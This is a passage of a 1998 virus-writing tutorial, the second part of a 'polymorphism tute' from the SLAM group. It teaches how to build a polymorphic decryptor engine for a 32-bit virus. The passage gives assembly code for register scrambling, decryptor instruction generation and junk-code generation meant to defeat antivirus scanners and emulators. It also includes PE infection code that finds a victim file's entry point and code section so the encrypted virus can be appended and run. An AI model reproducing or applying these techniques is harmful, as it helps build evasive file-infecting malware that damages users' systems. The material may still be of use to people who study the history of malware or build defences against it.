 a poly engine generating 32 bit code. In this way we can use any register to
 address  code:  [EAX],  [ECX],  etc.,  not like in 16 bit where you had less
 possibilities, like [DI], [BX+DI], etc.

        Let's check a way to choose random registers.
        NOTE: I will call "brandom32" a procedure that expects a value in EAX
 and returns a random value between 0 and original EAX-1.

        The idea behind this procedure is to put the codes for the registers,
 first  being  the  really  used  registers  and the rest, the junk (garbage)
 registers.  After  that,  the procedure should scramble them by exchanging 2
 between them several times:

        used_registers:
        kreg db 0
        preg db 1
        creg db 2
        lreg db 3
        jrg1 db 5
        jrg2 db 6
        jrg3 db 7

        Choose_random_regs proc near  ;
        lea edi, used_registers       ; point to registers
        lea esi, used_registers       ; point to registers
        mov edx, esi                  ; save position
        mov ecx, 50h                  ; scramble 50h times
        mangle:                       ;
            mov eax, 8                ;
            call brandom32            ; choose a random nr. between 0-7
            mov ebx, eax              ; in EBX
            mov eax, 8                ;
            call brandom32            ; choose a random nr. between 0-7
            cmp ebx, eax              ; in EAX
            je mangle                 ; if EAX=EBX choose again
            add edi, eax              ; increment first pointer
            add esi, ebx              ; increment second pointer
            mov al, byte ptr [edi]    ; and exchange the values
            xchg byte ptr [esi], al   ; between them
            mov byte ptr [edi], al    ;
            mov edi, edx              ; restore position
            mov esi, edx              ;
            loop mangle               ; and do it 50h times
            ret                       ;
        Choose_random_regs endp       ;

        After  this  we  can  use  the  registers  being  sure that they were
 randomly  choosed. Taking into account that the codes are aligned like this:
 xxxxxNNN,  to  fill  the proper ModR/M register you need to clear the ModR/M
 byte. Look below at the 'instruction generator'.


<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Random values chooser

        It is very important for the poly engine to choose many random values
 and  fill the real instructions with them.

        The  most common random value used is the encryption key. In order to
 have a strong key you must follow some rules, like:

        ş Don't have a key zero padded at the beginning (like 00158A45h)
        ş Don't have simetric keys (like ABCDDCBAh)

        Also,  another  common  random  value is the key 'increment'. I quote
 increment  because  you  mustn't always use the increasing/decreasing of the
 key.  You  may choose any kind of reversible math operation. In my MOF32 the
 key changes every iteration with any of the XOR, ADD and SUB operations.

        The  last  but not the least important random value is the encryption
 operation. My 32bit poly engine uses 3 encryption operations:

        1) the no key operation: applys a ROR/ROL over the code
        2) two code operation: applys XOR/ADD/SUB over the code with the next
           code (dword)
        3) key operation: applys XOR/ADD/SUB over the code with the key

        The  many  math  operation  you make, the stronger the encryption is.
 However  you  mustn't  raise  the  complexity of the decryptor itself. Other
 interesting operations to apply are NOT, NEG, XCHG.


<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Instruction generator

        Ok,  now it's the time to generate our decryptor's instructions. This
 is  a  procedure which is called in the mainloop and so, we need to keep the
 counter.  The  counter  shows  us which instruction must we generate in this
 iteration. Let's see how do I propose to declare the decryptor:

        decryptor:
        i1:     <instruction 1>
                db 0FEh
        i2      <instruction 2>
                db 0FEh
        ...
        ...
        in      <instruction n>
                db 0FEh

        So,  we  have  each  instruction of the decryptor declared, of course
 with  a  simple  set  of  registers,  but  BEWARE:  don't use EAX or AX when
 declaring  the  decryptor  because  for those the opcodes are different. For
 example:

        we define                ³      will actually become
        ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
        mov ebx, [ebx]           ³      mov creg, [preg]
        mov ebx, 0               ³      mov kreg, keyvalue
        etc...                   ³


        So,  you  understand:  you  define  the instructions and the compiler
 actually  computes  the  correct  opcodes  for  you  and  puts   them there.
 Nowallyou  have to do is copy each instruction and fill in the proper values
 or registers.

        You  have  two choices here: one is to fill the decryptor there where
 it's  declared  and then copy it to the destination, or you may copy byte by
 byte  and  fill  directly  to  the destination.  I think the first method is
 quicker.  You  need  to have a pointer, let's say ESI pointing the decryptor
 bytes.  In  order  to  have  things really simple, if your decryptor has few
 instructions  (MOF32  uses  a  12 instructions decryptor), you may choose to
 make  a  "case"  in  your  instructions  generator  routine  and  take  each
 instruction by hand, like this:

        cmp ecx, 1
        je ins1
        cmp ecx, 2
        je ins2
        ...
        jmp over

 ins1: ...
       jmp over
 ins2: ...
       jmp over
       ...
 over:
       ret

       You  understood  that  ecx  was  the  counter.  So if we must generate
 instruction  nr.3  we  jump  to ins3. Not it is very easy for you to fill in
 each  instruction,  and  that's  because  you  know  exactly  what  kind  of
 instruction  that  is  and  where you have to fill. Let us imagine that your
 third instruction looks like this as it's declared:

        mov ebx, 0

        and you must turn it into:

        mov kreg, keyvalue

        knowing that your kreg is EDX and the key value is 12345678h.

        The opcode for MOV EBX, 0         is: BBh 00h 00h 00h 00h
        The opcode for MOV EDX, 12345678h is: BAh 78h 56h 34h 12h

        The  REG field is on the last three bits of the opcode (read part I),
 so, first we clear it (ESI points to the instruction start):

                and byte ptr [esi], 00000111b

        and after that we fill the proper register:

                or byte ptr [esi], kreg

        And now we fill the value for the key:

                or dword ptr [esi+1], keyvalue

        DONE!  We  have our polymorphic instruction. All we have to do now is
 to copy it to the destination using lodsb/stosb or any other method.

        When  writing  a  poly  engine  I  recomend that you firstly write it
 without  any  kind  of  garbage  involved. Once you managed to generate your
 decryptor  and  it  works  ok,  then  you  procede  in  writing  the garbage
 generator.

        As for your help, here is the general decryptor used by MOF32:

       decryptor:
       i01:  mov ebx, 0                  ; mov preg, code_start
             db 0feh                     ;
       i02:  mov ebx, 0                  ; mov kreg, key
             db 0feh                     ;
       i03:  mov ebx, 0                  ; mov lreg, code_length/8
             db 0feh                     ;
       i04:  mov ebx, dword ptr [ebx]    ; mov creg, [preg] (mainloop)
             db 0feh                     ;
       i05:  add ebx, ecx                ; <op1> creg, kreg
             db 0feh                     ;
       i06:  ror ebx, 0                  ; <op2> creg, key2
             db 0feh                     ;
       i07:  add ebx, dword ptr [ebx+4]  ; <op3> creg, [preg+4]
             db 0feh                     ;
       i08:  mov dword ptr [ebx], ebx    ; mov [preg], creg
             db 0feh                     ;
       i09:  add ebx, keyvalue           ; <op4> kreg, keyvalue
             db 0feh                     ;
       i10:  add ebx, 4                  ; add ebx, 4
             db 0feh                     ;
       i11:  sub ebx, 1                  ; sub lreg, 1
             db 0feh                     ;
       i12:  jnz $                       ; jnz mainloop
             db 0feh, 0ffh               ;


        I  hope this is all clear as we are moving towards the real armour of
 the poly decryptor: the garbage...


<ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Garbage generator


        As  I  explained in the poly engine figure, the garbage  generator is
 called before generating the first real instruction and then after each real
 instruction. Here are the main types of instructions that the garbage should
 include:

        - <math op> jreg, <reg>/<mem>/<imm>
        - <logical op> jreg, <reg>/<mem>/<imm>
        - <test op> jreg, <reg>/<mem>/<imm>
        - <shift op>
        - jmps and conditional jumps
        - calls
        - unary operations (inc,dec,...)
        - pushad/popad
        - FPU instructions
        - priviledged instructions (smsw, sidt, etc...)

        Note: between a pushad and a popad any register may be destroyed...

        Ok,  now  we  called  the  garbgage  routine.  Firstly, how many junk
 instruction  are we going to create? Here is a question of philosophy. In my
 opinion,  as  to  be  an easy customizable, upgradable polymorphic engine, I
 propose to you to create as many junk instructions as the decryptor has real
 instructions.  So,  if  your  decryptor has 10 real instructions, you should
 create  at least 10 junk instructions between them. I want you to understand
 that  when  I say junk instruction, I also mean groups of instructions, like
 for  example:  pushad/mov  eax,  ebx/popad...  When  generating  the garbage
 instructions  you  will  have  a loop decreasing a counter towards 0. If you
 create  more than one instruction once (for example a call/jump combination)
 you  should  decrease  the  counter  by  two,  otherwise  you  will  get too
 many garbage instructions.

        Anyway, in my opinion, the garbage generator should look like this:

     ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
     ³ Garbage routine ³
     ÀÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
       ³
  ÚÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
  ³ ÚÄÄvÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿                       ³
  ³ ³  Choose random number of junk instructions  ³                       ³
  ³ ÀÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ                       ³
  ³    ³                                                                  ³
  ³ ÚÄÄvÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿                                          ³
  ³ ³ Garbage generator loop   ³                                          ³
  ³ ÀÄ^ÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÙ                                          ³
  ³   ³          ³                                                        ³
  ³   ³       ÚÄÄvÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ ³
  ³   ³       ³ Choose random garbage type        ÃÄ> Choose addressing ³ ³
  ³   ³       ÀÄÄùÄùÄùÄùÄùÄùÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ ÀÄÄÄÄÄÄÄÄÄÄùÄùÄùÄÄÄÄÙ ³
  ³   ³          ³ ³ ³ ³ ³ ³                                   ³ ³ ³      ³
  ³   ³          ³ ³ ³ ³ ³ ÀÄÄ> Type 1 ÄÄÄÄ>Â<ÄÄÄÄÄÄ mem2reg <ÄÙ ³ ³      ³
  ³   ³          ³ ³ ³ ³ ÀÄÄÄÄ> Type 2 ÄÄÄÄ>³<ÄÄÄÄÄÄ reg2reg <ÄÄÄÙ ³      ³
  ³   ³          ³ ³ ³ ÀÄÄÄÄÄÄ> Type 3 ÄÄÄÄ>³<ÄÄÄÄÄÄ etc...  <ÄÄÄÄÄÙ      ³
  ³   ³          ³ ³ ÀÄÄÄÄÄÄÄÄ> Type 4 ÄÄÄÄ>³                             ³
  ³   ³          ³ ÀÄÄÄÄÄÄÄÄÄÄ> Type 5 ÄÄÄÄ>³                             ³
  ³   ³          ÀÄÄÄÄÄÄÄÄÄÄÄÄ> Type 6 ÄÄÄÄ>³                             ³
  ³   ³                                     ³                             ³
  ³   ³       ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄvÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ ³
  ³   ³       ³  Generate the garbage instruction(s)                    ³ ³
  ³   ³       ÀÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ ³
  ³   ³          ³                                                        ³
  ³   ³       ÚÄÄvÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ ³
  ³   ³       ³  Save addresses if needed                               ³ ³
  ³   ³       ÀÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ ³
  ³   ³          ³                                                        ³
  ³ ÚÄÁÄÄÄÄÄÄÄÄÄÄvÄÄÄÄÄÄÄÄÄÄÄÄÄ¿                                          ³
  ³ ³ Decr. counter until 0    ³                                          ³
  ³ ÀÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ                                          ³
  ÀÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
     ÚÄvÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
     ³ Garbage routine exit ³
     ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ


        Let's take them piece by piece...
        I  already  spoke  about the garbage instructions number, but you may
 have  your own opinion on this, so I won't push it too much... My MOF32 uses
 a random number of junk instructions (4-15).

        Your  poly  engine  must  have  a  very  well  defined  set  of  junk
 instructions type. Let me give you an example:

        1 - mathematical operations
        2 - logical instructions
        3 - unary instructions
        4 - jump
        5 - call
        6 - back call
        7 - pushad/popad
        etc...

        You will need to have a little routine for handling each of these.

        When choosing the addressing type you must choose:

        1 - operand size (16 or 32 bit)
        2 - address size (16 or 32 bit)

        Knowing  these, you know which addressing table to use (check out the
 addressing  tables  in the first part). After locating the table, you choose
 the real addressing type (whether you have register to register, or register
 to  memory, and here whether you have index or not, displacement or not; all
 choices  must  be  done randomly)... After the choice was done, you have the
 Mod/RM  byte,  the  SIB  byte  and  eventualy  the immediate value. Also you
 may  have  operand  and address size prefixes if needed. After this you must
 turn towards the Opcode Map array...

        Here again you can choose to use the entire Intel(c) 386 table or you
 can  only  define  a few opcodes. For a best poly engine I think it's better
 to  use the entire table. To do that you need to have a few indexes defined.
 Let's see how:

     type1:
        row1, col1, len
        row2, col2, len
        ...
     type2:
        row1, col1, len
        roe2, col2, len
        ...

     For  example,  you  have the type one as being the math operations (add,
 sub).  You  define  the  row and column of the add instruction first and how
 many  cells  it  occupies  (check  the  opcode table). Your poly engine will
 choose a random set of row/col and a random place on that row... After this,
 you  must  make  the  corections.  The corrections imply choosing the corect
 memory  to  register opcode, instead of register to memory, or the immediate
 to register opcode.

        Here, eachone must make his own way of encoding the opcodes, as smart
 as possible.

        After  having the opcode, all you have to do is put the prefixes, the
 opcode,  the  Mod/Rm and SIB bytes and the immediate value one after another
 and store the instruction... There you are! You have a garbage instruction!

        Let  me explain something else: you need to have a specific procedure
 which  generates  ONE random garbag instruction. That's because, for example
 when creating a PUSHAD/POPAD structure, you must generate more junks between
 the push and pop.

        I  my  first polymorphism tutorial I explained how you can make the 2
 types  of calls combined with a jump. When creating the call I explained how
 you  must save the adress where the call will be done so that you can encode
 the  call. Well, a great thing is the back-call, as I call it... A back-call
 has the ability of increasing the number of runned instructions. A back-call
 looks like this:

                 jmp do_call
        Routine:
                 ...
                 ret
                 ...
                 jmp over_call
                 ...
        do_call: call Routine
                 ...
        over_call:
                 ...
                 call Routine
                 ...
                 call Routine

        I  guess  you  understood...  You create a call/jmp structure and you
 save the address of the call. Then you may generate no matter how many calls
 to  that  routine,  as  the  RET  will return the execution accordingly. You
 should beware however so that you don't make an infinite loop...

        For  the  FPU  instructions,  it is very easy to handle them (read my
 Anti-Debugging  and Anti-Emulator lair), but all you have to do is take care
 to reset the FPU from time to time...


                              ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   EXTRA PART   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                              ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[ turning  32bit ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


        I  promised  that  I  will  talk  a  little about the 32 bit specific
 thingies.

        As  I  explained  many  times,  I  think that a polymorphic decryptor
 should  have  everyting  coming  handy.  When  I  say  that  I mean that the
 polymorphic engine MUST correctly compute any value and address and fill the
 instructions  properly  with  them. One of the most important instruction is
 this:

        mov preg, code_start

        This  instruction  loads  the  pointer register with the address from
 where  the  decryptor starts to do it's job. It is necesary that this is the
 final  correct  address (meaning you mustn't use any kind of EBP+ or anyshit
 like this which attracts the eye).

        If  you  read  some  infos on the PE file you know that you have some
 important  areas  in  the  PE  header  and  also you know that among all the
 sections of the PE file there exist one which is called .CODE or .TEXT which
 contains  the executable code. Here is where usually a virus appends (others
 create a new section). The encrypted virus is to be found, let's say, at the
 end  of the .CODE section. Let's see what the poly engine must retrieve from
 the PE file in order to properly align itself:

      Notes: newmapaddress = an address where the opened victim file is
                             mapped.

      First we must locate the PE header:

      mov edi, dword ptr [newmapaddress]        ;
      add edi, 03ch                             ; locate the PE header
      mov esi, dword ptr [edi]                  ; address
      add esi, dword ptr [newmapaddress]        ;
      push esi                                  ; save it

      ESI holds the address of the PE header; now we lcoate the initial entry
 point:

      add esi, 028h                             ; locate EIP
      mov ebx, [esi]                            ; put it in EBX
      mov dword ptr [eip], ebx                  ; save it in EIP variable

      Now  we  must  locate  the imagebase (the address where the victim file
 loads in memory when it is executing):

      add esi, 0Ch                              ; locate imagebase
      add ebx, [esi]                            ; add it it EBX
      mov dword ptr [deltahandle], ebx          ; and save for alignment
      pop esi                                   ; restore PE address

      Now  we  must locate the address of the .CODE section. Here I will give
 the   simplest  and the less safe way; for better results you need to make a
 search routine for the .code section:

      add esi, 10Ch                             ; locate the pointer to raw
                                                ; data for the .code section.
      mov edi, dword ptr [esi]                  ; address
      mov esi, dword ptr [esi-4]                ; size of raw data
      add edi, esi                              ; point to end of code
      sub edi, virus_size                       ; go back to virus start

      In  this  way you have the EDI pointing to a relative address where the
 encrypted  virus  part starts. When the file loads into memory, it is mapped
 starting from the imagebase, which means that if you do:

      add edi, deltahandle

      You  have  EDI  holding  the exact address of the encrypted part of the
 virus  upon  the execution of the victim file. This means that you must fill
 the code_start with the value in EDI. In this way, when the decryptor starts
 it'll  need no more alignment as the PREG will point exactly to the start of
 the code to be decrypted... Neat, huh?

        Another important thing: to have a well guarded engine, do not bother
 to  make  the entry point at the beginning of your virus and there to have a
 delta_handle  getter  and a jump to the decryptor. Instead, make the new EIP
 to  point  directly to the poly decryptor as you need no Delta handle in it.
 You will get the delta handle in the virus beginning after it is decrypted.

        Another  good  idea  is  this: the .code section, or whatever section
 your  virus  lives  in,  has  a raw size different, smaller than the virtual
 size.  This means that after the virus body you have an empty space... Rings
 any  bells?  Usualy  the poly engines have junk instructions that affect the
 registers,  but  only  the  real  instructions  of  the decryptor affect the
 memory,  by writing to it. This gives the AV dude an easy way of finding the
 decryptor's instructions... However, upon creating the polymorphic decryptor
 you can do something like this:

 calculate the absolute end of the virus = .code section relative address +
                                           virus size +
                                           imagebase

        Save  the value as a 'freemem' variable. Save another variable called
 'freelength'  which  equals  the  virtual  size minus freemem. Now, when you
 create a junk instruction, you can do this:

        - decide to make a register to memory instruction
        - generate a random number N between freemem and freemem+freelength
        - generate a MOV [N], reg

        There  you are!! You have a junk instruction that writes to memory...
 As many as you have the better. You can also make something like this:

        mov jreg1, N
        ...
        mov [jreg1], reg

        Now  this last instruction looks exactly like the real instruction of
 the  decryptor that reads MOV [preg], creg... Which brings chaos in the mind
 of the one who wants to understand de decryptor...

        Another  thing  about  the  win32  is  that  you  can use priviledged
 instructions like smsw which are not emulated by any code emulator for now.


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[  final word  ]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


        Here ends another tutorial. I hope this one was and will be useful to
 you. If you find it useful you may drop me a line at:

                           lordjulus@geocities.com

        I  always answer the mail, and I always respect the opinions of other
 people. So, don't be shy and write me your impressions...

        Hoping I did help you a little, I invite you to visit me on the WEB:

                     http://members.tripod.com/~lordjulus
                    http://members.xoom.com/Julus [MIRROR]

ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
³     LORD JULUS (c) 1998 [SLAM] ³ http://members.tripod.com/~lordjulus      ³
ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
ÛÛ²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²ÛÛ
ÛÛ²²±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±²²ÛÛ
ÛÛ²²±±°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°±±²²ÛÛ
ÛÛ²²±±°°                                                              °°±±²²ÛÛ
ÛÛ²²±±°°  polymorphism tute part II - Nov.1998 [a SLAM presentation]  °°±±²²ÛÛ
ÛÛ²²±±°°                                                              °°±±²²ÛÛ
ÛÛ²²±±°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°±±²²ÛÛ
ÛÛ²²±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±²²ÛÛ
ÛÛ²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²ÛÛ
ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
